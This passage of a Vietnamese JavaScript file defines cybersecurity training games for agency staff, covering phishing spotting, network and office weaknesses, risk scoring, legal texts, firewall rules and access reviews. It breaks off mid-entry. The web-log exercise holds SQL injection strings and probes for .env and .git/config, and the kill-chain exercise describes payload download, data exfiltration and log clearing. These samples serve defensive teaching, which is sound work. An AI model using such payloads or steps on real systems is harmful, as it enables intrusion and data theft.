/* =========================================================
   NỘI DUNG CÁC TRÒ CHƠI / BÀI TẬP TƯƠNG TÁC
   type: spot (soi bất thường) · sort (phân loại) · order (sắp xếp)
         matrix (ma trận rủi ro) · fw (tường lửa) · cards (chọn mức) · branch (tình huống phân nhánh)
   ========================================================= */
(function(){
const G = [];
const H = (id, t) => '<span class="seg" data-h="' + id + '">' + t + '</span>';

/* ---------- 1. Soi thư giả mạo ---------- */
G.push({ id: 'soithu', cd: 1, type: 'spot', ic: 'mail', c: '#e11d48', t: 'Soi thư giả mạo', d: 'Tìm 7 dấu hiệu bất thường trong một thư “mời họp khẩn”.',
  intro: 'Đồng chí nhận được thư dưới đây lúc 08:52. Bấm vào mọi chi tiết đáng ngờ. Có 7 dấu hiệu.',
  html: '<div class="card" style="padding:0;overflow:hidden;font-size:.93rem">' +
    '<div style="background:#0b1b3f;color:#fff;padding:10px 16px;font-weight:700">Hộp thư công vụ · Thư đến</div>' +
    '<div style="padding:16px 18px;line-height:1.9">' +
    '<div><b>Từ:</b> Van phong CQ Mau &lt;' + H('dom', 'thongbao@cqrnau.lab') + '&gt;</div>' +
    '<div><b>Trả lời đến:</b> ' + H('reply', 'hop.khan.2026@mailtam.lab') + '</div>' +
    '<div><b>Đến:</b> nguyen.thu.ha@cqmau.lab</div>' +
    '<div><b>Chủ đề:</b> Thong bao lich hop khan Ban Thuong vu – ' + H('urgent', 'phan hoi truoc 10h') + '</div>' +
    '<div><b>Xác thực:</b> ' + H('spf', 'spf=fail · dkim=none') + ' <span class="muted small">(máy chủ gửi: mx.cqrnau.lab 203.0.113.66)</span></div>' +
    '<hr style="border:0;border-top:1px solid #e3e9f3">' +
    '<p>Kính gửi đồng chí,</p><p>Văn phòng thông báo lịch họp khẩn. ' + H('login', 'Đề nghị đồng chí mở tệp đính kèm và đăng nhập bằng tài khoản thư công vụ') + ' để xác nhận tham dự. Trường hợp không xác nhận, ' + H('threat', 'tên đồng chí sẽ bị đưa ra khỏi danh sách và báo cáo Thường trực') + '.</p>' +
    '<p>Trân trọng,<br>Văn phòng</p>' +
    '<div style="display:inline-flex;gap:8px;align-items:center;border:1px solid #e3e9f3;border-radius:10px;padding:8px 12px;background:#f8fafc">📎 ' + H('att', 'ThongBao_LichHop_T11.html') + ' <span class="muted small">6 KB</span></div>' +
    '</div></div>',
  spots: {
    dom: ['Tên miền na ná', '“cqrnau” – hai chữ “rn” đứng cạnh nhau trông giống chữ “m”. Tên miền thật là cqmau.lab.'],
    reply: ['Trả lời đến hộp thư lạ', 'Reply-To khác hẳn tên miền người gửi – thư trả lời sẽ rơi vào tay kẻ gian.'],
    urgent: ['Tạo sức ép thời gian', 'Hạn gấp khiến người nhận bỏ qua bước kiểm tra.'],
    spf: ['Xác thực người gửi thất bại', 'SPF fail, không có chữ ký DKIM: máy chủ gửi không được phép gửi thay tên miền này.'],
    login: ['Đòi đăng nhập từ tệp đính kèm', 'Không có quy trình hợp lệ nào yêu cầu đăng nhập thư công vụ từ một tệp đính kèm.'],
    threat: ['Đe doạ hậu quả', 'Gây sợ hãi để thúc người nhận làm theo.'],
    att: ['Tệp .html đính kèm', 'Tệp HTML mở ra trang đăng nhập giả (gửi mật khẩu tới cqmau-xacthuc.lab).']
  },
  lesson: 'Gặp thư như vậy: không mở tệp, không đăng nhập; gọi điện xác minh qua số đã biết; chuyển tiếp thư cho bộ phận CNTT dưới dạng tệp đính kèm (giữ nguyên tiêu đề).' });

/* ---------- 2. Soi sơ đồ mạng ---------- */
G.push({ id: 'soimang', cd: 1, type: 'spot', svg: 'net', ic: 'network', c: '#2563eb', t: 'Soi sơ đồ mạng', d: 'Tìm 6 điểm yếu trên sơ đồ mạng của một cơ quan giả lập.',
  intro: 'Sơ đồ hiện trạng do phòng CNTT vẽ. Bấm vào các thành phần hoặc đường kết nối có điểm yếu. Có 6 điểm yếu.',
  spots: {
    rdp: ['RDP mở ra Internet', 'Quy tắc cho phép mọi địa chỉ truy cập cổng 3389 của máy chủ văn bản – lối vào phổ biến của tấn công dò mật khẩu.'],
    vpn: ['VPN không có MFA', 'Lộ mật khẩu là vào được mạng nội bộ.'],
    flat: ['Máy in chung vùng máy chủ', 'Thiết bị ít được vá nằm cùng vùng với máy chủ trọng yếu – cần tách vùng.'],
    bk: ['Sao lưu luôn kết nối, cùng vùng', 'Mã độc tống tiền có thể mã hoá luôn bản sao lưu. Cần bản tách rời/không ghi đè được.'],
    nas: ['Thiết bị lạ không có trong danh mục', 'NAS cũ vẫn chạy, không ai quản lý – “tài sản bóng tối”.'],
    wifi: ['Wi-Fi khách nối thẳng vào mạng văn phòng', 'Khách có thể truy cập máy trạm, máy chủ.']
  },
  lesson: 'Điểm yếu thường nằm ở chỗ “tạm thời”, “cho tiện”, “chưa ai quản lý”. Mỗi điểm yếu phải đi vào sổ rủi ro (PL-02) với người xử lý.' });

/* ---------- 3. Soi phòng làm việc ---------- */
G.push({ id: 'soiphong', cd: 1, type: 'spot', svg: 'office', ic: 'eye', c: '#f97316', t: 'Soi phòng làm việc', d: 'Bức tranh văn phòng có 7 thói quen mất an toàn. Đồng chí tìm được bao nhiêu?',
  intro: 'Một buổi chiều ở phòng Tổng hợp. Bấm vào những chỗ không an toàn. Có 7 chỗ.',
  spots: {
    note: ['Mật khẩu dán trên màn hình', 'Ai đi ngang cũng đọc được.'],
    lock: ['Rời chỗ không khoá máy', 'Màn hình còn đăng nhập quyền quản trị, người khác có thể thao tác bằng danh tính của đồng chí.'],
    usb: ['USB lạ cắm vào máy', 'USB nhặt được có thể chứa mã độc tự chạy.'],
    print: ['Tài liệu bỏ quên ở máy in', 'Văn bản có thể bị người khác cầm đi.'],
    wifi: ['Mật khẩu Wi-Fi nội bộ dán trên bảng', 'Khách nhìn thấy và kết nối vào mạng nội bộ.'],
    door: ['Cửa phòng máy chủ chèn mở', 'Mất kiểm soát truy cập vật lý.'],
    phone: ['Đọc mã OTP cho người gọi điện', 'Không cơ quan nào hỏi mã OTP qua điện thoại.']
  },
  lesson: 'An ninh mạng bắt đầu từ thói quen: khoá máy (Windows + L), không dán mật khẩu, không cắm USB lạ, lấy tài liệu in ngay, không đọc OTP cho ai.' });

/* ---------- 4. CIA ---------- */
G.push({ id: 'cia', cd: 1, type: 'sort', ic: 'shield', c: '#7c3aed', t: 'Bí mật – Toàn vẹn – Sẵn sàng', d: 'Xếp 9 sự cố vào thuộc tính bị ảnh hưởng chính.',
  intro: 'Chọn một thẻ rồi chọn ô. Mỗi sự cố chỉ xét thuộc tính bị ảnh hưởng CHÍNH.',
  bins: [['C', 'Bí mật (bị LỘ)', '#2563eb'], ['I', 'Toàn vẹn (bị SỬA)', '#7c3aed'], ['A', 'Sẵn sàng (bị MẤT, GIÁN ĐOẠN)', '#f97316']],
  items: [
    ['Dự thảo nghị quyết bị chụp màn hình gửi ra nhóm mạng xã hội', 'C', 'Thông tin bị lộ.'],
    ['Số văn bản và ngày ban hành trong hệ thống bị sửa', 'I', 'Dữ liệu bị thay đổi trái phép.'],
    ['Máy chủ văn bản bị mã hoá, không mở được trước giờ họp', 'A', 'Không sử dụng được khi cần.'],
    ['Kẻ gian đọc được hộp thư của chánh văn phòng', 'C', ''],
    ['Trang tin của cơ quan bị thay ảnh và nội dung', 'I', ''],
    ['Đường truyền bị tấn công từ chối dịch vụ, cổng thông tin không truy cập được', 'A', ''],
    ['Danh sách đảng viên bị sao chép ra USB cá nhân', 'C', ''],
    ['Nhật ký hệ thống bị xoá để che dấu vết', 'I', 'Bản ghi bị thay đổi/xoá: mất tính toàn vẹn của nhật ký.'],
    ['Ổ cứng máy chủ tệp hỏng, không có bản sao lưu', 'A', '']
  ] });

/* ---------- 5. CSF ---------- */
G.push({ id: 'csf', cd: 1, type: 'sort', ic: 'layers', c: '#0b1b3f', t: '6 chức năng NIST CSF 2.0', d: 'Ghép 12 công việc vào đúng chức năng.',
  intro: 'Mỗi việc thuộc chức năng nào của CSF 2.0?',
  bins: [['GV', 'Quản trị', '#0b1b3f'], ['ID', 'Nhận diện', '#2563eb'], ['PR', 'Bảo vệ', '#7c3aed'], ['DE', 'Phát hiện', '#f59e0b'], ['RS', 'Ứng phó', '#e11d48'], ['RC', 'Khôi phục', '#16a34a']],
  items: [
    ['Ban hành quy chế an ninh mạng, phân công trách nhiệm', 'GV'], ['Đánh giá rủi ro nhà cung cấp bảo trì', 'GV'],
    ['Lập danh mục tài sản thông tin', 'ID'], ['Lập sổ đăng ký rủi ro', 'ID'],
    ['Bật xác thực đa yếu tố', 'PR'], ['Tập huấn nhận diện thư giả mạo', 'PR'],
    ['Theo dõi cảnh báo trên Wazuh', 'DE'], ['Phân tích đăng nhập thất bại bất thường', 'DE'],
    ['Cô lập máy chủ bị xâm nhập', 'RS'], ['Báo cáo sự cố cho cấp có thẩm quyền', 'RS'],
    ['Khôi phục hệ thống từ bản sao lưu sạch', 'RC'], ['Thông báo khôi phục dịch vụ cho người dùng', 'RC']
  ] });

/* ---------- 6. Ma trận rủi ro ---------- */
G.push({ id: 'matran', cd: 1, type: 'matrix', ic: 'chart', c: '#dc2626', t: 'Đặt rủi ro lên ma trận 5×5', d: 'Chấm L, I cho 5 kịch bản rồi so với chuyên gia.',
  intro: 'Chọn kịch bản, bấm vào ô tương ứng với khả năng (L) và tác động (I) mà đồng chí đánh giá. Chênh lệch ±1 được coi là hợp lý nếu có luận cứ.',
  risks: [
    { id: 'R01', t: 'Thư giả mạo chiếm hộp thư công vụ (chưa bật MFA; 7/30 hộp thư đã nhận thư giả trong tuần)', L: 4, I: 4, why: 'Đã có thư thật trong tuần (L cao); hộp thư chứa văn bản đến, lộ là tác động lớn.' },
    { id: 'R02', t: 'Máy chủ tệp hỏng ổ cứng, không có sao lưu', L: 2, I: 5, why: 'Hỏng ổ ít gặp nhưng mất toàn bộ dữ liệu không khôi phục được.' },
    { id: 'R03', t: 'Quy tắc RDP mở ra Internet bị dò mật khẩu', L: 5, I: 5, why: 'Bị quét liên tục; chiếm được là vào thẳng máy chủ văn bản.' },
    { id: 'R04', t: 'Cổng thông tin bị thay giao diện qua lỗi plugin cũ', L: 3, I: 3, why: 'Có lỗi công khai nhưng đã có WAF; ảnh hưởng uy tín, không lộ dữ liệu nội bộ.' },
    { id: 'R05', t: 'Máy in quét tài liệu bị chiếm làm bàn đạp', L: 2, I: 2, why: 'Khó khai thác, ít dữ liệu; nhưng không nên để chung vùng máy chủ.' }
  ] });

/* ---------- 7. Còn hiệu lực không? ---------- */
G.push({ id: 'hieuluc', cd: 2, type: 'sort', ic: 'scale', c: '#7c3aed', t: 'Còn hiệu lực không?', d: 'Phân loại 10 văn bản theo trạng thái tại ngày 17/11/2026.',
  intro: 'Tại ngày tập huấn (17/11/2026), văn bản nào còn hiệu lực, văn bản nào đã hết, văn bản nào chỉ còn viện dẫn chuyển tiếp hoặc cần kiểm tra?',
  bins: [['ok', 'Còn hiệu lực', '#16a34a'], ['end', 'Hết hiệu lực', '#dc2626'], ['tran', 'Chuyển tiếp / cần kiểm tra', '#d97706']],
  items: [
    ['Luật An ninh mạng 116/2025/QH15', 'ok', 'Hiệu lực từ 01/7/2026.'],
    ['Luật An toàn thông tin mạng 86/2015/QH13', 'end', 'Hết hiệu lực 01/7/2026 (Điều 44 Luật 2025).'],
    ['Luật An ninh mạng 24/2018/QH14', 'end', 'Hết hiệu lực 01/7/2026.'],
    ['Nghị định 331/2026/NĐ-CP (bảo vệ HTTT)', 'ok', 'Hiệu lực 19/8/2026.'],
    ['Nghị định 85/2016/NĐ-CP (cấp độ cũ)', 'tran', 'Chỉ viện dẫn trong Điều 39 NĐ 331 cho hệ thống đang đầu tư trước 01/7/2026.'],
    ['Nghị định 13/2023/NĐ-CP (bảo vệ DLCN)', 'end', 'Bị thay thế bởi NĐ 356/2025 từ 01/01/2026.'],
    ['Nghị định 356/2025/NĐ-CP (hướng dẫn Luật BVDLCN)', 'ok', 'Hiệu lực 01/01/2026.'],
    ['Luật Bảo vệ dữ liệu cá nhân 91/2025/QH15', 'ok', 'Hiệu lực 01/01/2026.'],
    ['Nghị định 330/2026/NĐ-CP (xử phạt ANM, DLCN)', 'ok', 'Hiệu lực 19/8/2026, không chuyển tiếp.'],
    ['Quyết định 05/2017/QĐ-TTg (phương án ứng cứu)', 'tran', 'Căn cứ luật cũ đã hết hiệu lực – cần kiểm tra trước khi viện dẫn.']
  ] });

/* ---------- 8. Ghép nghị định ---------- */
G.push({ id: 'nghidinh', cd: 2, type: 'sort', ic: 'gavel', c: '#2563eb', t: 'Tình huống nào – văn bản nào?', d: 'Ghép 8 tình huống với văn bản cần tra cứu đầu tiên.',
  intro: 'Gặp tình huống này, cán bộ cần mở văn bản nào trước?',
  bins: [['331', 'NĐ 331/2026 – bảo vệ HTTT, cấp độ', '#f97316'], ['330', 'NĐ 330/2026 – xử phạt', '#7c3aed'], ['333', 'NĐ 333/2026 – biện pháp thi hành', '#2563eb'], ['332', 'NĐ 332/2026 – kinh doanh SP, DV ANM', '#0d9488'], ['356', 'NĐ 356/2025 – dữ liệu cá nhân', '#16a34a']],
  items: [
    ['Lập hồ sơ đề xuất cấp độ cho hệ thống văn bản', '331'], ['Xác định thẩm quyền phê duyệt hệ thống cấp độ 3', '331'],
    ['Một đơn vị bị lập biên bản vì chia sẻ dữ liệu cá nhân trái phép', '330'],
    ['Chuẩn bị tiếp đoàn kiểm tra an ninh mạng, thẩm định an ninh mạng', '333'], ['Xây dựng phương án ứng phó, khắc phục sự cố', '333'],
    ['Thuê doanh nghiệp cung cấp dịch vụ giám sát an ninh mạng – kiểm tra giấy phép', '332'],
    ['Xác định trường “tình trạng sức khoẻ” là dữ liệu nhạy cảm', '356'], ['Thời hạn trả lời yêu cầu của chủ thể dữ liệu', '356']
  ] });

/* ---------- 9. Dữ liệu cá nhân ---------- */
G.push({ id: 'dlcn', cd: 2, type: 'sort', ic: 'user', c: '#16a34a', t: 'Phân loại dữ liệu cá nhân', d: 'Trường nào là cơ bản, trường nào nhạy cảm theo NĐ 356/2025?',
  intro: 'Hệ thống “Hồ sơ cán bộ” (giả lập) có các trường dưới đây. Xếp theo Điều 3, Điều 4 Nghị định 356/2025/NĐ-CP. Khi lập hồ sơ thật, đối chiếu nguyên văn.',
  bins: [['cb', 'Dữ liệu cá nhân cơ bản', '#2563eb'], ['nc', 'Dữ liệu cá nhân nhạy cảm', '#e11d48'], ['kh', 'Không phải dữ liệu cá nhân', '#64748b']],
  items: [
    ['Họ, chữ đệm và tên khai sinh', 'cb'], ['Ngày, tháng, năm sinh', 'cb'], ['Giới tính', 'cb'], ['Nơi thường trú', 'cb'], ['Thông tin quan hệ vợ, chồng', 'cb', 'NĐ 356 bổ sung quan hệ vợ, chồng vào nhóm cơ bản.'],
    ['Dân tộc (dữ liệu tiết lộ nguồn gốc dân tộc)', 'nc'], ['Tôn giáo, tín ngưỡng', 'nc'], ['Tình trạng sức khoẻ', 'nc'], ['Lịch sử hoạt động trên không gian mạng', 'nc'],
    ['Số lượng văn bản đến trong tháng của phòng', 'kh', 'Số liệu thống kê không gắn với một người cụ thể.'], ['Tên đơn vị, địa chỉ trụ sở cơ quan', 'kh']
  ] });

/* ---------- 10. Đề xuất cấp độ ---------- */
G.push({ id: 'capdo', cd: 5, type: 'cards', ic: 'form', c: '#f97316', t: 'Đề xuất cấp độ cho 8 hệ thống', d: 'Đọc mô tả, chọn cấp độ đề xuất và lý do.',
  intro: 'Dựa trên bản tóm tắt tiêu chí Điều 11–15 NĐ 331/2026. Đây là bài luyện lập luận, không phải kết luận pháp lý.',
  opts: ['1', '2', '3', '4', '5'],
  items: [
    { t: 'Trang tin nội bộ chỉ đăng lịch công tác công khai, thông báo chung', a: '1', why: 'Phục vụ nội bộ, chỉ thông tin công cộng.' },
    { t: 'Phần mềm quản lý hồ sơ cán bộ của một cơ quan, có thông tin cá nhân, không xử lý bí mật nhà nước', a: '2', why: 'Nội bộ, có thông tin cá nhân, không có BMNN.' },
    { t: 'Mạng LAN và hạ tầng máy chủ phục vụ hoạt động của một cơ quan', a: '2', why: 'Hạ tầng thông tin phục vụ hoạt động của một cơ quan, tổ chức.' },
    { t: 'Cổng dịch vụ công cấp tỉnh tiếp nhận thủ tục hành chính trực tuyến', a: '3', why: 'Cung cấp thủ tục hành chính; phạm vi tỉnh.' },
    { t: 'Hạ tầng điện toán đám mây dùng chung cho các sở, ngành của tỉnh', a: '3', why: 'Hạ tầng dùng chung cấp tỉnh.' },
    { t: 'Hệ thống xử lý dữ liệu cá nhân của hàng triệu người dân', a: '3', why: 'Dữ liệu cá nhân quy mô lớn – tối thiểu cấp 3; có thể cao hơn tuỳ tiêu chí cụ thể.' },
    { t: 'Hệ thống thông tin quốc gia phục vụ Chính phủ điện tử, vận hành 24/7 trên toàn quốc', a: '4', why: 'Hệ thống quốc gia, phạm vi toàn quốc.' },
    { t: 'Hệ thống mà khi bị phá hoại gây tổn hại đặc biệt nghiêm trọng tới an ninh quốc gia', a: '5', why: 'Cấp 5, mặc định là HTTT quan trọng về an ninh quốc gia.' }
  ] });

/* ---------- 11. Kill chain ---------- */
G.push({ id: 'killchain', cd: 3, type: 'order', ic: 'route', c: '#c026d3', t: 'Sắp xếp chuỗi tấn công', d: 'Xếp 8 sự việc của vụ tấn công 07/11 theo đúng trình tự.',
  intro: 'Kéo thả hoặc dùng mũi tên để xếp từ sớm nhất đến muộn nhất. Gợi ý: nghĩ theo Cyber Kill Chain.',
  items: [
    ['Kẻ tấn công quét cổng, thấy 3389 mở trên địa chỉ 203.0.113.11', 'Trinh sát – T1595'],
    ['Gửi thư giả mạo, lấy được mật khẩu của nguyen.thu.ha (05/11)', 'Phát tán – T1566'],
    ['Thử hàng trăm mật khẩu qua RDP lúc 09:10 ngày 07/11', 'Khai thác – T1110'],
    ['Đăng nhập thành công bằng tài khoản nguyen.thu.ha (4624, LogonType 10)', 'Truy cập – T1078'],
    ['Tải sync_tool.exe từ 203.0.113.77 bằng PowerShell', 'Cài đặt – T1105'],
    ['Tạo tài khoản hotro.it2 và thêm vào nhóm Administrators', 'Duy trì – T1136'],
    ['Gửi khoảng 2 GB ra 203.0.113.77 cổng 443', 'Hành động – T1041'],
    ['Xoá nhật ký bảo mật (sự kiện 1102)', 'Che dấu vết – T1070.001']
  ] });

/* ---------- 12. Giải phẫu HTTP ---------- */
G.push({ id: 'http', cd: 3, type: 'spot', ic: 'terminal', c: '#0ea5e9', t: 'Giải phẫu một yêu cầu HTTP', d: 'Bấm đúng 6 thành phần theo câu hỏi.',
  quiz: true,
  intro: 'Đây là một cặp yêu cầu/phản hồi đã làm sạch từ Juice Shop trong lab. Làm lần lượt từng câu hỏi bên phải.',
  html: '<pre class="demo-box" style="white-space:pre-wrap">' +
    H('method', 'GET') + ' ' + H('path', '/rest/products/search?q=apple') + ' HTTP/1.1\n' +
    'Host: ' + H('host', '192.168.56.20:3000') + '\n' +
    'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Firefox/128.0\n' +
    'Accept: application/json, text/plain, */*\n' +
    H('cookie', 'Cookie: language=vi_VN; token=&lt;ĐÃ LÀM SẠCH&gt;') + '\n\n' +
    'HTTP/1.1 ' + H('status', '200 OK') + '\n' +
    'Access-Control-Allow-Origin: *\n' +
    'X-Content-Type-Options: nosniff\n' +
    H('xfo', 'X-Frame-Options: SAMEORIGIN') + '\n' +
    'Content-Type: application/json; charset=utf-8\n\n' +
    '{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99}]}</pre>',
  spots: {
    method: ['Phương thức', 'GET – yêu cầu lấy dữ liệu.'], path: ['Đường dẫn và tham số', 'Tham số q=apple là dữ liệu người dùng nhập – nơi kiểm thử chèn mã.'],
    host: ['Máy chủ đích', 'Phải thuộc dải lab 192.168.56.0/24.'], cookie: ['Cookie phiên', 'Chứa token – PHẢI làm sạch trước khi đưa vào báo cáo.'],
    status: ['Mã trạng thái', '200 – thành công.'], xfo: ['Tiêu đề bảo mật', 'X-Frame-Options chống nhúng trang vào khung (clickjacking).']
  },
  asks: [['method', 'Phương thức của yêu cầu?'], ['status', 'Mã trạng thái phản hồi?'], ['cookie', 'Phần nào phải làm sạch trước khi nộp báo cáo?'], ['path', 'Dữ liệu người dùng nhập nằm ở đâu?'], ['host', 'Đích của yêu cầu (để kiểm tra đúng phạm vi lab)?'], ['xfo', 'Một tiêu đề bảo mật trong phản hồi?']] });

/* ---------- 13. Trang đăng nhập giả ---------- */
G.push({ id: 'dangnhapgia', cd: 3, type: 'spot', ic: 'lock', c: '#be123c', t: 'Soi trang đăng nhập giả', d: 'Tìm 5 dấu hiệu của trang thu thập mật khẩu.',
  intro: 'Bấm vào tệp đính kèm trong thư giả, trình duyệt mở trang dưới đây. Tìm 5 dấu hiệu.',
  html: '<div class="card" style="padding:0;overflow:hidden">' +
    '<div style="background:#e2e8f0;padding:8px 12px;display:flex;gap:8px;align-items:center;font-size:.85rem"><span>' + H('http', '⚠ Không bảo mật') + '</span><span style="background:#fff;border-radius:999px;padding:4px 12px;flex:1">' + H('url', 'http://cqmau-xacthuc.lab/login?u=nguyen.thu.ha') + '</span></div>' +
    '<div style="padding:28px;text-align:center;background:linear-gradient(160deg,#eff6ff,#fff)">' +
    '<div style="font-weight:900;font-size:1.3rem;color:#0b1b3f">' + H('logo', 'CƠ QUAN MẪU · Thư điện tử công vụ (logo mờ, lệch màu)') + '</div>' +
    '<p class="muted">Phiên của đồng chí đã hết hạn. ' + H('cnt', 'Còn 04:59 để xác nhận, sau đó tài khoản bị khoá') + '</p>' +
    '<div style="max-width:320px;margin:0 auto;text-align:left;display:grid;gap:8px"><input disabled value="nguyen.thu.ha" style="padding:10px;border-radius:10px;border:1px solid #cbd5e1"><input disabled type="password" value="********" style="padding:10px;border-radius:10px;border:1px solid #cbd5e1">' +
    '<div>' + H('otp', 'Nhập thêm mã OTP gửi về điện thoại:') + ' <input disabled style="width:90px;padding:6px;border:1px solid #cbd5e1;border-radius:8px"></div><button disabled class="btn" style="width:100%">Xác nhận</button></div></div></div>',
  spots: {
    http: ['Không có HTTPS', 'Trang đăng nhập thật của cơ quan luôn dùng HTTPS.'], url: ['Tên miền giả', 'cqmau-xacthuc.lab không phải tên miền của cơ quan (mail.cqmau.lab).'],
    logo: ['Nhận diện sai lệch', 'Logo, màu sắc, chính tả khác trang thật.'], cnt: ['Đếm ngược ép buộc', 'Tạo áp lực để người dùng không kịp suy nghĩ.'],
    otp: ['Đòi mã OTP', 'Kẻ gian dùng OTP ngay lập tức để vượt xác thực hai lớp.']
  },
  lesson: 'Chỉ đăng nhập bằng cách tự gõ địa chỉ hoặc dùng dấu trang đã lưu, không qua liên kết trong thư.' });

/* ---------- 14. Nhật ký web ---------- */
G.push({ id: 'weblog', cd: 3, type: 'sort', ic: 'activity', c: '#0ea5e9', t: 'Đọc nhật ký web: thử hay thành công?', d: 'Phân loại 9 dòng nhật ký truy cập cổng thông tin.',
  intro: 'Mỗi dòng là một yêu cầu tới cổng thông tin. Xếp vào ô phù hợp. Chú ý mã trạng thái và kích thước.',
  mono: true,
  bins: [['ok', 'Bình thường', '#16a34a'], ['scan', 'Dò quét (chưa có kết quả)', '#f59e0b'], ['blk', 'Thử tấn công – đã bị chặn', '#2563eb'], ['bad', 'Đáng lo – phải xử lý', '#e11d48']],
  items: [
    ['198.51.100.44 "GET /tin-tuc?id=152" 200 18342', 'ok'], ['192.0.2.80 "GET /van-ban?so=88" 200 9421 "Timkiembot/2.1"', 'ok', 'Bot tìm kiếm hợp lệ – nhiều yêu cầu nhất nhưng không phải tấn công.'],
    ['203.0.113.45 "GET /wp-login.php" 404 162', 'scan'], ['203.0.113.45 "GET /backup.zip" 404 162', 'scan'], ['203.0.113.45 "GET /.env" 404 162', 'scan'],
    ["203.0.113.45 \"GET /tin-tuc?id=12'+OR+'1'='1\" 403 199 \"sqlmap\"", 'blk', 'WAF chặn – vẫn ghi nhận là hành vi tấn công.'],
    ['203.0.113.45 "GET /.git/config" 200 312', 'bad', 'Tệp cấu hình mã nguồn bị lộ (OWASP A02 Cấu hình sai).'],
    ["203.0.113.45 \"GET /tim-kiem?q=ke+hoach'))--\" 500 18734", 'bad', 'Lỗi 500 trả về trang lỗi lớn – có thể lộ thông tin (OWASP A10 Xử lý ngoại lệ).'],
    ['198.51.100.91 "GET /static/css/site.css" 304 0', 'ok']
  ] });

/* ---------- 15. Tường lửa ---------- */
G.push({ id: 'tuonglua', cd: 4, type: 'fw', ic: 'firewall', c: '#dc2626', t: 'Mô phỏng tường lửa', d: 'Viết bộ quy tắc để 8 gói tin đi đúng: cho phép thứ cần, chặn mọi thứ khác.',
  intro: 'Quy tắc xét từ trên xuống, gói tin khớp quy tắc nào trước thì theo quy tắc đó. Cuối cùng là chặn mặc định. Bấm “Chạy thử” để xem gói tin đi.',
  zones: ['Internet', 'DMZ', 'Máy chủ', 'Văn phòng', 'CNTT', 'Nhà thầu (198.51.100.200)'],
  ports: ['443', '80', '3389', '22', '445', '25', 'any'],
  start: [['Internet', 'DMZ', '443', 'allow'], ['any', 'Máy chủ', '3389', 'allow']],
  packets: [
    ['Người dân xem cổng thông tin', 'Internet', 'DMZ', '443', 'allow'],
    ['Kẻ lạ dò RDP vào máy chủ văn bản', 'Internet', 'Máy chủ', '3389', 'deny'],
    ['Chuyên viên mở hệ thống văn bản', 'Văn phòng', 'Máy chủ', '443', 'allow'],
    ['Quản trị viên RDP vào máy chủ', 'CNTT', 'Máy chủ', '3389', 'allow'],
    ['Máy văn phòng RDP vào máy chủ', 'Văn phòng', 'Máy chủ', '3389', 'deny'],
    ['Nhà thầu bảo trì truy cập hệ thống văn bản', 'Nhà thầu (198.51.100.200)', 'Máy chủ', '443', 'allow'],
    ['Máy văn phòng truy cập chia sẻ tệp SMB', 'Văn phòng', 'Máy chủ', '445', 'allow'],
    ['Internet truy cập chia sẻ tệp SMB', 'Internet', 'Máy chủ', '445', 'deny']
  ] });

/* ---------- 16. Đặt cảm biến ---------- */
G.push({ id: 'camdat', cd: 4, type: 'sort', ic: 'radar', c: '#f59e0b', t: 'Biện pháp nào, đặt ở đâu?', d: 'Ghép 8 nhu cầu bảo vệ với biện pháp phù hợp.',
  intro: 'Mỗi nhu cầu cần biện pháp nào?',
  bins: [['fw', 'Tường lửa', '#dc2626'], ['ids', 'IDS (giám sát)', '#f59e0b'], ['ips', 'IPS (inline)', '#f97316'], ['waf', 'WAF', '#7c3aed'], ['edr', 'EDR', '#0d9488'], ['siem', 'SIEM (Wazuh)', '#2563eb']],
  items: [
    ['Chỉ cho phép cổng 443 từ Internet vào DMZ', 'fw'], ['Xem lưu lượng nội bộ để phát hiện quét cổng mà không ảnh hưởng đường truyền', 'ids'],
    ['Chặn ngay gói tin khớp mẫu khai thác đã biết trên đường vào', 'ips'], ['Chặn yêu cầu chứa SQL injection tới cổng thông tin', 'waf'],
    ['Cô lập từ xa một máy trạm đang chạy tiến trình lạ', 'edr'], ['Tập trung nhật ký 5 máy chủ, tương quan và cảnh báo', 'siem'],
    ['Phát hiện PowerShell tải tệp .exe trên máy chủ', 'edr'], ['Lưu nhật ký ở nơi kẻ tấn công không xoá được', 'siem']
  ] });

/* ---------- 17. Phân quyền ---------- */
G.push({ id: 'phanquyen', cd: 4, type: 'spot', ic: 'users', c: '#0d9488', t: 'Rà soát ma trận phân quyền', d: 'Tìm 5 vi phạm nguyên tắc quyền tối thiểu.',
  intro: 'Bảng phân quyền hệ thống văn bản cập nhật ngày 15/09/2026. Bấm vào ô vi phạm. Có 5 vi phạm.',
  html: '<div class="tbl-wrap"><table class="tbl"><thead><tr><th>Tài khoản</th><th>Phòng / trạng thái</th><th>Vai trò</th><th>Quản trị hệ thống</th><th>MFA</th></tr></thead><tbody>' +
    '<tr><td>nguyen.thu.ha</td><td>Văn phòng</td><td>Chuyên viên</td><td>–</td><td>' + H('mfa1', 'Chưa bật') + '</td></tr>' +
    '<tr><td>tran.van.binh</td><td>Tổng hợp</td><td>Chuyên viên</td><td>–</td><td>Đã bật</td></tr>' +
    '<tr><td>vu.ngoc.lan</td><td>' + H('retired', 'Nghỉ hưu từ 01/10/2026') + '</td><td>Văn thư</td><td>–</td><td>Đã bật</td></tr>' +
    '<tr><td>le.minh.quan</td><td>Hành chính – Tài chính</td><td>Chuyên viên</td><td>' + H('adm', 'Có') + '</td><td>Đã bật</td></tr>' +
    '<tr><td>pham.quoc.tuan</td><td>CNTT</td><td>Quản trị</td><td>Có</td><td>' + H('mfa2', 'Chưa bật') + '</td></tr>' +
    '<tr><td>' + H('shared', 'vanphong.chung') + '</td><td>Dùng chung 6 người</td><td>Chuyên viên</td><td>–</td><td>Chưa bật</td></tr>' +
    '<tr><td>do.thanh.son</td><td>CNTT</td><td>Quản trị</td><td>Có</td><td>Đã bật</td></tr>' +
    '</tbody></table></div>',
  spots: {
    mfa1: ['Tài khoản đã nhận thư giả chưa bật MFA', 'Đây chính là tài khoản bị chiếm ngày 07/11.'], retired: ['Tài khoản người đã nghỉ hưu chưa thu hồi', 'Phải thu hồi ngay khi nghỉ.'],
    adm: ['Chuyên viên có quyền quản trị', 'Quyền vượt nhu cầu công việc.'], mfa2: ['Tài khoản quản trị không có MFA', 'Tài khoản quyền cao nhất phải bật MFA đầu tiên.'],
    shared: ['Tài khoản dùng chung', 'Không truy được ai làm gì; không áp được MFA cá nhân.']
  } });

/* ---------- 18. RACI ---------- */
G.push({ id: 'raci', cd: 6, type: 'sort', ic: 'users', c: '#e11d48', t: 'Ai làm gì khi có sự cố?', d: 'Giao 8 việc cho vai trò THỰC HIỆN chính.',
  intro: 'Ai là người trực tiếp làm (R) mỗi việc trong 60 phút đầu?',
